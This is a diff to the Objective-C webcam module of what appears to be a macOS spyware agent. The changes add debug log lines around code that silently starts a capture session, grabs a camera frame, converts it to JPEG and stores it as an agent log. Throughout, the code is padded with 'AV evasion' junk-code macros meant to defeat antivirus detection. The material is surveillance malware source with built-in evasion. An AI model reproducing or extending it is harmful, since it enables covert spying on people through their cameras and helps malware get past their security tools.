@@ -57,15 +57,28 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   // AV evasion: only on release build
   AV_GARBAGE_008
   
+#ifdef DEBUG_WEBCAM
+  infoLog(@"receiving buffer");
+#endif
+  
   if (videoFrame == nil )
+  {
+#ifdef DEBUG_WEBCAM
+    infoLog(@"videoFrame none");
+#endif
     return;
+  }
   
   // AV evasion: only on release build
   AV_GARBAGE_001
   
   if (mImageGrabbed == YES)
+  {
+#ifdef DEBUG_WEBCAM
+    infoLog(@"mImageGrabbed already grabbed");
+#endif
     return;
-  
+  }
   // AV evasion: only on release build
   AV_GARBAGE_002
   
@@ -79,6 +92,9 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   // AV evasion: only on release build
   AV_GARBAGE_003
   
+#ifdef DEBUG_WEBCAM
+  infoLog(@"grabbed");
+#endif
 }
 
 - (BOOL)_releaseSession
@@ -150,6 +166,10 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
   
   if ([mCaptureDecompressedVideoOutput delegate] != self)
     [mCaptureDecompressedVideoOutput setDelegate: self];
+  
+#ifdef DEBUG_WEBCAM
+  infoLog(@"delegate: %@", [mCaptureDecompressedVideoOutput delegate]);
+#endif
   
   // AV evasion: only on release build
   AV_GARBAGE_003
@@ -223,7 +243,11 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
       AV_GARBAGE_003
     
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
-    
+      
+#ifdef DEBUG_WEBCAM
+      infoLog(@"starting session");
+#endif
+      
       if ([self _startSession] == NO) 
         {
           @synchronized(self)
@@ -239,12 +263,21 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
               
               mCurrentImageBuffer = NULL;
             }
+          
+#ifdef DEBUG_WEBCAM
+          infoLog(@"error starting session");
+#endif
+          
           [innerPool release];
           break;
         }
       
       // AV evasion: only on release build
       AV_GARBAGE_005
+      
+#ifdef DEBUG_WEBCAM
+      infoLog(@"waiting image...");
+#endif
       
       while (mImageGrabbed == NO)
         {
@@ -254,6 +287,10 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
       
       // AV evasion: only on release build
       AV_GARBAGE_000
+      
+#ifdef DEBUG_WEBCAM
+      infoLog(@"stopping session");
+#endif
       
       if ([self _stopSession] == NO) 
         {
@@ -284,7 +321,11 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
           [innerPool release];
           break;
         }
-        
+      
+#ifdef DEBUG_WEBCAM
+      infoLog(@"create JPEG");
+#endif
+      
       NSBitmapImageRep *bitmap = [[NSBitmapImageRep alloc] 
                                   initWithCIImage: [CIImage imageWithCVImageBuffer: mCurrentImageBuffer]];
       
@@ -301,6 +342,10 @@ static __m_MAgentWebcam *sharedAgentWebcam = nil;
       
       // AV evasion: only on release build
       AV_GARBAGE_003
+      
+#ifdef DEBUG_WEBCAM
+      infoLog(@"create log");
+#endif
       
       __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
       BOOL success = [logManager createLog: AGENT_CAM
